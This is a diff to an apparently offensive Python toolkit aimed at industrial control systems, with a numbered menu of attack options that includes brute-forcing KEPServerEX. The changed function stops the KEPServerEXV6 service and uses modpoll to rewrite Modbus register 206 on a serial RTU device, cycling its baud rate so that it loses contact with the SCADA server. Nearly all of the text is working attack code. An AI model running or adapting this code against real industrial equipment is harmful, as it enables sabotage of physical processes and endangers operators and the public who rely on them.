@@ -441,8 +441,8 @@ def bruteForceKEP():
     if success == 0:
         print("\nFail.")
 
-#Run modpoll to change baud rate - Register 40206 from 19200 to 1=9600
-def changeBaudRateFrom19200To9600():
+#Run modpoll to change baud rate - Register 40206 
+def changeBaudRate():
     netshare = run(['sc', 'query', 'KEPServerEXV6'], stdout=PIPE, stderr=PIPE, text=True)
     if "RUNNING" in netshare.stdout:
         print("Kepserver is running, Stopping now.")
@@ -458,7 +458,29 @@ def changeBaudRateFrom19200To9600():
     current_directory = getcwd()
     executable_path = current_directory + "\\modpoll.exe"
 
-    parameters = ["-b", "19200", "-p", "none", "-m", "rtu", "-a", "25", "-r", "206", "COM1", "1"]
+    # Call checkBaudRate to determine current baudrate
+    current_baudrate = checkBaudRate()
+    print(f"Current BaudRate:{current_baudrate}")
+
+    # Use current_baudrate value to set the new baudrate value in parameters list
+    new_baudrate = None
+    identifyBR = None
+    if current_baudrate == "4800":
+        new_baudrate = "1"
+        identifyBR = "9600"
+    elif current_baudrate == "9600":
+        new_baudrate = "2"
+        identifyBR = "19200"
+    elif current_baudrate == "19200":
+        new_baudrate = "0"
+        identifyBR = "4800"
+    else:
+        print("Error: Unknown baudrate")
+        return
+
+    print(f"Changed Current BaudRate:{current_baudrate} to {new_baudrate} = {identifyBR}")
+
+    parameters = ["-b", current_baudrate, "-p", "none", "-m", "rtu", "-a", "25", "-r", "206", "COM1", new_baudrate]
     try:
         check_call([executable_path] + parameters)
 
@@ -996,7 +1018,7 @@ if __name__ == '__main__':
     elif attackoption == "12":
         bruteForceKEP()
     elif attackoption == "13":
-        changeBaudRateFrom19200To9600()
+        changeBaudRate()
     elif attackoption == "14": # Test checkbaudrate
         checkBaudRate()
     elif attackoption == "-h":
